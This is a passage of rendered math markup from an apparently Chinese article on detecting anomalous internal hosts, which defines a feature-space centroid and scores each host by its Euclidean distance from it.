mathvariant="bold">X</mi><mi>t</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\mathbf{c}\left(\mathbf{X}_{t}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathbf">c</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord"><span class="mord mathbf">X</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span>：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="bold">c</mi><mrow><mo fence="true">(</mo><msub><mi mathvariant="bold">X</mi><mi>t</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mfrac><mrow><msub><mo>∑</mo><mi>h</mi></msub><msubsup><mi>x</mi><mi>t</mi><mn>1</mn></msubsup><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo></mrow><mrow><mo fence="true">∣</mo><msub><mi mathvariant="bold">X</mi><mi>t</mi></msub><mo fence="true">∣</mo></mrow></mfrac><mo separator="true">,</mo><mfrac><mrow><msub><mo>∑</mo><mi>h</mi></msub><msubsup><mi>x</mi><mi>t</mi><mn>2</mn></msubsup><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo></mrow><mrow><mo fence="true">∣</mo><msub><mi mathvariant="bold">X</mi><mi>t</mi></msub><mo fence="true">∣</mo></mrow></mfrac><mo separator="true">,</mo><mfrac><mrow><msub><mo>∑</mo><mi>h</mi></msub><msubsup><mi>x</mi><mi>t</mi><mn>3</mn></msubsup><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo></mrow><mrow><mo fence="true">∣</mo><msub><mi mathvariant="bold">X</mi><mi>t</mi></msub><mo fence="true">∣</mo></mrow></mfrac><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>h</mi><mo>∈</mo><msub><mi>H</mi><mi>I</mi></msub></mrow><annotation encoding="application/x-tex">\mathbf{c}\left(\mathbf{X}_{t}\right)=\left(\frac{\sum_{h} x_{t}^{1}(h)}{\left|\mathbf{X}_{t}\right|}, \frac{\sum_{h} x_{t}^{2}(h)}{\left|\mathbf{X}_{t}\right|}, \frac{\sum_{h} x_{t}^{3}(h)}{\left|\mathbf{X}_{t}\right|}\right), h \in H_{I}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathbf">c</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord"><span class="mord mathbf">X</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.808947em;vertical-align:-0.65002em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.158927em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span><span class="mord mtight"><span class="mord mtight"><span class="mord mathbf mtight">X</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.29634285714285713em;"><span style="top:-2.357em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.5350070000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1745899999999999em;"><span style="top:-2.1785614285714283em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.32143857142857146em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.214em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathdefault mtight">h</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.158927em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span><span class="mord mtight"><span class="mord mtight"><span class="mord mathbf mtight">X</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.29634285714285713em;"><span style="top:-2.357em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.5350070000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1745899999999999em;"><span style="top:-2.1785614285714283em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.32143857142857146em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.214em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathdefault mtight">h</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.158927em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span><span class="mord mtight"><span class="mord mtight"><span class="mord mathbf mtight">X</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.29634285714285713em;"><span style="top:-2.357em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">∣</span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.5350070000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1745899999999999em;"><span style="top:-2.1785614285714283em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.32143857142857146em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.214em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathdefault mtight">h</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>x</mi><mi>t</mi><mi>i</mi></msubsup><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x_{t}^{i}(h)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0746639999999998em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">h</span><span class="mclose">)</span></span></span></span>表示主机h特征向量<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="bold">x</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">\mathbf{x}_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.59444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">x</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的第 i 个特征；<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">∣</mo><msub><mi mathvariant="bold">X</mi><mi>t</mi></msub><mo fence="true">∣</mo></mrow><annotation encoding="application/x-tex">\left|\mathbf{X}_{t}\right|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord"><span class="mord"><span class="mord mathbf">X</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span></span></span></span>表示<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="bold">X</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">\mathbf{X}_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83611em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">X</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>C</mi><mi>a</mi><mi>r</mi><mi>d</mi><mi>i</mi><mi>n</mi><mi>a</mi><mi>l</mi><mi>i</mi><mi>t</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">Cardinality</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">d</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>（集合中元素的个数）。</p><p>因此，<strong>质心centroid也是一个特征向量</strong>，他表示<strong>所有主机特征向量的分量的平均值</strong>。</p><p>最后，我们为每个内部主机h计算特征向量<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="bold">x</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">\mathbf{x}_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.59444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">x</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>与特征空间质心<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="bold">c</mi><mrow><mo fence="true">(</mo><msub><mi mathvariant="bold">X</mi><mi>t</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\mathbf{c}\left(\mathbf{X}_{t}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathbf">c</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord"><span class="mord mathbf">X</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span>之间的欧式距离，从而得出<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>s</mi><mi>t</mi><mn>1</mn></msubsup></mrow><annotation encoding="application/x-tex">s_{t}^{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.061108em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>分数：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>s</mi><mi>t</mi><mn>1</mn></msubsup><mo>=</mo><msub><mi>d</mi><mi>t</mi></msub><mrow><mo fence="true">(</mo><msub><mi mathvariant="bold">x</mi><mi>t</mi></msub><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi mathvariant="bold">c</mi><mrow><mo fence="true">(</mo><msub><mi mathvariant="bold">X</mi><mi>t</mi></msub><mo fence="true">)</mo></mrow><mo fence="true">)</mo></mrow><mo>=</mo><msqrt><mrow><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mn>3</mn></msubsup><msup><mrow><mo fence="true">(</mo><msubsup><mi>x</mi><mi>t</mi><mi>i</mi></msubsup><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo><mo>−</mo><msup><mi>c</mi><mi>i</mi></msup><mrow><mo fence="true">(</mo><msub><mi mathvariant="bold">X</mi><mi>t</mi></msub><mo fence="true">)</mo></mrow><mo fence="true">)</mo></mrow><mn>2</mn></msup></mrow></msqrt></mrow><annotation encoding="application/x-tex">s_{t}^{1}=d_{t}\left(\mathbf{x}_{t}(h), \mathbf{c}\left(\mathbf{X}_{t}\right)\right)=\sqrt{\sum_{i=1}^{3}\left(x_{t}^{i}(h)-c^{i}\left(\mathbf{X}_{t}\right)\right)^{2}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.061108em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord"><span class="mord mathbf">x</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">h</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathbf">c</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord"><span class="mord mathbf">X</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.84em;vertical-align:-0.5030009999999998em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3369990000000003em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8064639999999998em;"><span style="top:-2.454244em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.0448em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24575599999999992em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">h</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.750664em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord"><span class="mord mathbf">X</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.054008em;"><span style="top:-3.3029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing 